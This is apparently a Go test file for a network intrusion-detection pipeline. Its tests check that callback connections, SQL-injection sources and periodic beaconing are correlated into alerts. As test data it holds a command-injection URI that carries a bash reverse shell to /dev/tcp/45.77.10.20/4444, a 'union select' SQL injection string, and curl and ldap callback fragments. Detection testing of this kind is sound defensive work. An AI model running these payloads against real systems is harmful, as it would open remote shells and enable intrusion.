package pipeline

import (
	"context"
	"net/url"
	"strings"
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/detect"
	"netsa/internal/exposure"
	"netsa/internal/learn"
	"netsa/internal/model"
	"netsa/internal/store"
)

// corrRun 依次处理事件（每条一批，保证先后顺序），返回告警与流水线。
func corrRun(t *testing.T, exp *exposure.Manager, l *learn.Learner, evs []*model.Event) (map[string]*model.Alert, *store.Store) {
	t.Helper()
	eng, err := detect.NewEngine("", 1)
	if err != nil {
		t.Fatal(err)
	}
	st := store.New(1000, 1000, 100, 7*24*time.Hour)
	got := map[string]*model.Alert{}
	p := &Pipeline{Engine: eng, Behavior: detect.NewBehavior(config.Default().Detect.Thresholds), Store: st, Exposure: exp, Learn: l,
		OnAlert: func(a *model.Alert) { got[a.RuleID+" "+a.SrcIP] = a }}
	in := make(chan []*model.Event, len(evs))
	done := p.Run(context.Background(), in, 1)
	for _, ev := range evs {
		in <- []*model.Event{ev}
	}
	close(in)
	<-done
	return got, st
}

func egressEv(src, dst string, port int, at time.Time) *model.Event {
	return &model.Event{Kind: model.KindFirewall, SrcIP: src, DstIP: dst, DstPort: port, Proto: "tcp", Action: model.ActionAllow,
		SrcZone: "trust", DstZone: "untrust", Time: at}
}

func attackEv(src, uri string, at time.Time) *model.Event {
	return &model.Event{Kind: model.KindWeb, SrcIP: src, Host: "shop.example.com", Method: "GET", URI: uri, Status: 200, Bytes: 800,
		UA: "Mozilla/5.0", Time: at}
}

// 攻击载荷中的回连地址在攻击之后被内网主机连接：载荷已被执行，严重；攻击来源被自动确认。
func TestCallbackPayloadAddress(t *testing.T) {
	l, err := learn.Load(learn.Options{Escalate: true})
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now().Add(-time.Hour)
	shell := "/cgi?cmd=" + url.QueryEscape(";bash -i >& /dev/tcp/45.77.10.20/4444 0>&1")
	got, st := corrRun(t, nil, l, []*model.Event{
		egressEv("10.0.0.8", "8.8.8.8", 53, now.Add(-time.Hour)), // 攻击之前就连接过的地址
		attackEv("203.0.113.9", shell+"%20ping%208.8.8.8", now),
		egressEv("10.0.0.8", "45.77.10.20", 4444, now.Add(20*time.Second)),
		egressEv("10.0.0.8", "8.8.8.8", 53, now.Add(30*time.Second)),
	})
	a := got["corr-callback 10.0.0.8"]
	if a == nil || a.Severity != model.SevCritical || !strings.Contains(a.Evidence, "攻击载荷中") || !strings.Contains(a.Evidence, "203.0.113.9") {
		t.Fatalf("应判为载荷已被执行: %+v", a)
	}
	if n := 0; true {
		for k := range got {
			if strings.HasPrefix(k, "corr-callback") {
				n++
			}
		}
		if n != 1 {
			t.Fatalf("公共 DNS 不应关联: %v", got)
		}
	}
	if reason := l.Report().Attack.AutoTotal; reason != 1 {
		t.Fatalf("应自动确认攻击来源: %d", reason)
	}
	found := false
	for _, c := range st.CompromisedAssets() {
		found = found || c.Asset == "10.0.0.8"
	}
	if !found {
		t.Fatal("应列为疑似失陷主机")
	}
}

// 连接攻击者本身：对外提供服务的主机高危；办公终端中危（不列为失陷）；攻击之前就连接过、本单位自己的地址不关联。
func TestCallbackAttacker(t *testing.T) {
	exp, err := exposure.Load(config.ExposureConfig{Services: []config.ExposureService{{Name: "web", PublicIP: "198.51.100.10", PublicPort: 443}}})
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now().Add(-time.Hour)
	inbound := &model.Event{Kind: model.KindFirewall, SrcIP: "198.18.0.1", DstIP: "198.51.100.10", DstPort: 443, Proto: "tcp",
		Action: model.ActionAllow, NatDstIP: "10.0.0.20", SrcZone: "untrust", DstZone: "dmz", Time: now.Add(-time.Hour)}
	sqli := "/item?id=" + url.QueryEscape("1 union select 1,2")
	got, _ := corrRun(t, exp, nil, []*model.Event{
		inbound,
		egressEv("10.0.0.30", "203.0.113.50", 443, now.Add(-time.Hour)), // 攻击之前就连接过
		attackEv("203.0.113.40", sqli, now),
		attackEv("203.0.113.50", sqli, now),
		attackEv("198.51.100.10", sqli, now), // 内部用户经出口 NAT 访问自己的网站
		egressEv("10.0.0.20", "203.0.113.40", 8080, now.Add(time.Minute)),
		egressEv("10.0.0.31", "203.0.113.40", 443, now.Add(2*time.Minute)),
		egressEv("10.0.0.30", "203.0.113.50", 443, now.Add(time.Minute)),
		egressEv("10.0.0.32", "198.51.100.10", 443, now.Add(time.Minute)),
		egressEv("10.0.0.33", "203.0.113.40", 443, now.Add(3*time.Hour)), // 超过关联窗口
	})
	if a := got["corr-callback 10.0.0.20"]; a == nil || a.Severity != model.SevHigh || !strings.Contains(a.Evidence, "对外提供服务") {
		t.Fatalf("对外提供服务的主机: %+v", a)
	}
	if a := got["corr-callback 10.0.0.31"]; a == nil || a.Severity != model.SevMedium {
		t.Fatalf("办公终端: %+v", a)
	}
	for _, ip := range []string{"10.0.0.30", "10.0.0.32", "10.0.0.33"} {
		if a := got["corr-callback "+ip]; a != nil {
			t.Errorf("%s 不应关联: %+v", ip, a)
		}
	}
}

// 定时外连本单位登记或自动识别的对外服务只打标签；兜底端口（allowed_ports 80、443）不代表任意外部地址都是本单位的。
func TestBeaconOwnServiceOnly(t *testing.T) {
	exp, err := exposure.Load(config.ExposureConfig{Enabled: true, AllowedPorts: []int{80, 443},
		Services: []config.ExposureService{{Name: "ai", PublicIP: "198.51.100.20", PublicPort: 443}}})
	if err != nil {
		t.Fatal(err)
	}
	if !exp.Own("198.51.100.20", 443, "tcp") || exp.Own("203.0.113.7", 443, "tcp") || !exp.OwnIP("198.51.100.20") || exp.OwnIP("203.0.113.7") {
		t.Fatal("Own / OwnIP")
	}
	start := time.Now().Add(-3 * time.Hour)
	var evs []*model.Event
	for i := 0; i < 12; i++ {
		at := start.Add(time.Duration(i) * 5 * time.Minute)
		evs = append(evs, egressEv("10.0.0.40", "198.51.100.20", 443, at), egressEv("10.0.0.41", "203.0.113.7", 443, at))
	}
	got, _ := corrRun(t, exp, nil, evs)
	if a := got["bhv-beacon 10.0.0.40"]; a != nil {
		t.Fatalf("定时连接本单位的服务不应告警: %+v", a)
	}
	if a := got["bhv-beacon 10.0.0.41"]; a == nil || a.Severity != model.SevMedium {
		t.Fatalf("定时连接外部地址的 443 端口仍应告警: %+v", got)
	}
}

func TestIPv4Tokens(t *testing.T) {
	got := strings.Join(ipv4Tokens("bash -i >& /dev/tcp/45.77.10.20/4444 v1.2.3.4.5 1.2.3. curl http://8.8.8.8/x ldap://1.2.3.4:1389", 8), ",")
	if got != "45.77.10.20,8.8.8.8,1.2.3.4" {
		t.Fatal(got)
	}
}
